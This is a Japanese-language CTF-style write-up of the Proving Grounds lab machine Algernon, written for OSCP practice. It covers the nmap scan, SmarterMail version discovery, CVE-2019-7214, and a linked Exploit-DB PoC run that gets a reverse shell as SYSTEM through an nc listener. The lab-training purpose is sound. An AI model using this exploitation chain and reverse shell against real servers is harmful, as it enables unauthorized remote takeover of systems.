+++
title = "[OSCP PEN200] ProvingGrounds Algernon Writeup"
date = 2026-10-17T19:00:00+09:00
description = "AlgernonマシンのWriteup"
draft = true
+++

AlgernonマシンのWriteupである。

# Scan
最初にTCP,UDPの全ポートに対してスキャンを行ったところ、TCPで21,80,5040,7680,9998が開いていた。（気になったポートのみ記載。）

```
# Nmap 7.99 scan initiated Sat Apr 25 22:55:42 2026 as: /usr/lib/nmap/nmap --privileged -vvv -p 21,80,135,139,445,5040,7680,9998,17001,49664,49665,49666,49667,49668,49669 -4 -sCV -T4 -o ./192.168.XXX.65/192.168.218.65_TCP.txt 192.168.218.65
Nmap scan report for 192.168.218.65
Host is up, received reset ttl 125 (0.071s latency).
Scanned at 2026-04-25 22:55:43 EDT for 182s

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 125 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 04-25-26  07:53PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
9998/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 9D7294CAAB5C2DF4CD916F53653714D5
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Sun, 26 Apr 2026 02:58:22 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
```

上から順番に見ていき、9998番にアクセスすると、以下のSmarterMailというWebメールサービスのログインページにリダイレクトされる。

![](/images/Algernon/1.png)

SmartMailのバージョンはこのページを見ただけでは判明しない。とりあえず、ソースを確認してみたところ、\<head\>以下の\<script\>に`stProductVersion`及び、`StProductBuild`変数が存在した。

![](/images/Algernon/2.png)

これらのバージョン番号を検索してみると、[CVE-2019-7214](https://nvd.nist.gov/vuln/detail/cve-2019-7214)の脆弱性が存在するようである。
この脆弱性はサーバーのポート17001番が開いている場合に、認証されていない攻撃者がコマンドを実行できるものである。

対象マシンでも17001番が開いているためこの脆弱性への攻撃を試行する。

# Exploit
PoCを検索すると、[これ](https://www.exploit-db.com/exploits/49216)がヒットする。
このpythonスクリプトはターゲットのIP,ポート（今回は17001）、リバースシェルの接続先のIP,PORTを設定してやる必要がある。

ncで待ち受けてから設定したスクリプトを実行するとリバースシェルを獲得した。

```
┌──(kali㉿kali)-[~/algernon]
└─$ nc -lvnp 1111                                              
listening on [any] 1111 ...
connect to [192.168.11.111] from (UNKNOWN) [192.168.106.65] 49963
whoami
nt authority\system

```

デスクトップにフラグ。
```
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/29/2020   9:29 PM           1450 Microsoft Edge.lnk
-a----       10/17/2026   6:20 AM             34 proof.txt
```